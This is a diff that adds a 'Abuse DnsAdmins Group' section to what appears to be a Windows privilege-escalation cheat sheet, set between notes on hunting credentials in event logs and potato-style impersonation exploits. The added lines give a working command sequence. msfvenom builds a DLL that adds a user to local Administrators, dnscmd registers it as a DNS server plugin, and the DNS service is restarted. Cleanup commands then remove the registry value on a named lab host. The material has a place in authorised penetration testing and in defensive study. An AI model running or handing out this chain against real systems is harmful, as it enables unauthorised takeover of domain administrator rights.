@@ -418,6 +418,23 @@ wevtutil qe Security /rd:true /f:text | Select-String "/user"
 ```
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
+### Abuse DnsAdmins Group
+Exploit
+```
+msfvenom -p windows/x64/exec cmd='net localgroup "Administrators" netadm /add' -f dll -o adduser.dll
+sc query dns
+sc sdshow dns
+transfer adduser.dll to the victim
+dnscmd /config /serverlevelplugindll C:\Users\netadm\adduser.dll
+sc stop dns
+sc start dns
+```
+Cleanup
+```
+reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+sc start dns
+```
 ### Abuse SeImpersonatePrivilege(GodPotato->JuicyPotatoNG->RoguePotato->PrintSpoofer->JuicyPotato)
 >JuicyPotato -> Windows 7/8, Server 2008 R2/2012/2012 R2, early Windows 10/Server 2016
 >RoguePotato -> Intended for Windows 10 1809+ and Server 2019 where JuicyPotato stopped working
